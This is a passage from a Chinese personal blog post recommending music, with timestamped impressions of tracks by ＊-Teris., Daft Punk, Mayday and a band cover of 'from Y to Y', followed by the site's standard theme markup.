<p><strong>[3:56 - 5:29]</strong></p>
<p>极富力量感和动感的电音lead乐器将我们带回了现实，尽管主题是重复的，但这时的情感已经和 breakdown 之前不同了，这夜晚变得更加深沉。</p>
<p><strong>[5:29 - 6:29 Epilogue]</strong></p>
<p>尾声。</p>
<h3 id="Noctambule-＊-Teris"><a href="#Noctambule-＊-Teris" class="headerlink" title="Noctambule - ＊-Teris."></a>Noctambule - ＊-Teris.</h3><blockquote>
<p>链接：<a target="_blank" rel="noopener" href="https://music.163.com/song?id=1974436463&userid=127208986">https://music.163.com/song?id=1974436463&amp;userid=127208986</a><br>风格：garage house&#x2F;jazz</p>
</blockquote>
<p>一听到前奏就收藏了，感觉独特的jazz风电子音乐，处理地特别特别干净，作者太懂留白了。很多留白出会插入意想不到的乐器，有bass、有8-bit风电子乐器等等……</p>
<p>不过我最喜欢的还是 **[2:01 - 3:01]**，有种梦幻的感觉。</p>
<h3 id="Random-Access-Memories-Daft-Punk"><a href="#Random-Access-Memories-Daft-Punk" class="headerlink" title="Random Access Memories - Daft Punk"></a>Random Access Memories - Daft Punk</h3><blockquote>
<p>链接：<a target="_blank" rel="noopener" href="https://music.163.com/album?id=165455240&userid=127208986">https://music.163.com/album?id=165455240&amp;userid=127208986</a><br>风格：电子音乐</p>
</blockquote>
<p>真的神专，每一首都值得反复听。随便挑一首特别喜欢的出来：Giorgio by Moroder，一首由采访起手的音乐，后面有点Trance的感觉，一步步铺垫情感，我就是被Trance给害了。<br>尤其是第一段落结束后（ <strong>[4:59 - 5:15]</strong> ），在Giorgio说出：</p>
<blockquote>
<p>Once you free your mind about a concept of harmony and of music being ‘correct’,<br>you can do whatever you want.<br>So nobody told me what to do, and there was no preconception of what to do.</p>
</blockquote>
<p>之后，突然进了弦乐（ <strong>[5:15 - 5:49]</strong> ），尽情表现着星空下的自由，然后主题再次回归，搭配弦乐，谁听了不会感动！</p>
<p>除了这段外，还有一个我很喜欢的细节——搓碟的声音和鼓的声音非常搭配地重叠在一起，非常独特的听感。<br>总之，我所说的神专，之所以是神，是因为它能带给我独特的体验，我相信它也能给其他听众带来不同的体验，所以大家都快去听。</p>
<h3 id="干杯-五月天"><a href="#干杯-五月天" class="headerlink" title="干杯 - 五月天"></a>干杯 - 五月天</h3><blockquote>
<p>链接：<a target="_blank" rel="noopener" href="https://music.163.com/song?id=22197007&userid=127208986">网易云</a><br>评语：神MV。和时间、人生有关的歌总是特别吸引人，7 years也是这样。</p>
</blockquote>
<p>不剧透了，快去看MV！<br>唯一的缺陷就是音域太广了，我实在唱不了，不然每次KTV都要唱这首555</p>
<h3 id="from-Y-to-Y-乐队演奏-ろじえも"><a href="#from-Y-to-Y-乐队演奏-ろじえも" class="headerlink" title="from Y to Y (乐队演奏) - ろじえも"></a>from Y to Y (乐队演奏) - ろじえも</h3><blockquote>
<p>链接：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Sx411A7Lv">Bilibili</a><br>评语：神作，治愈系，给人以力量</p>
</blockquote>
<p>鼓手对强弱的掌控实在是太好了，这样的演奏就好像是<strong>完美</strong>的，让人觉得这里就是这样最好，没别的更好了。<br>中间一段听得鸡皮疙瘩都起来了，impressive orz，本家和演奏都是绝对的神作。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Cameudis"
      src="/images/ava1.jpg">
  <p class="site-author-name" itemprop="name">Cameudis</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">65</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/cameudis" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cameudis" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:cameudis@gmail.com" title="E-Mail → mailto:cameudis@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://x.com/cameudis" title="Twitter → https:&#x2F;&#x2F;x.com&#x2F;cameudis" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-dove"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Cameudis</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  















    <div id="pjax">
  

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : 'Ji5y9HTOlb2QGDO0XFlWXNRy-gzGzoHsz',
      appKey     : '6VqGye1352LX381YQDTOaiXs',
      placeholder: "El Psy Congroo",
      avatar     : 'retro',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : true,
      lang       : '' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

    </div>
</body>
</html>
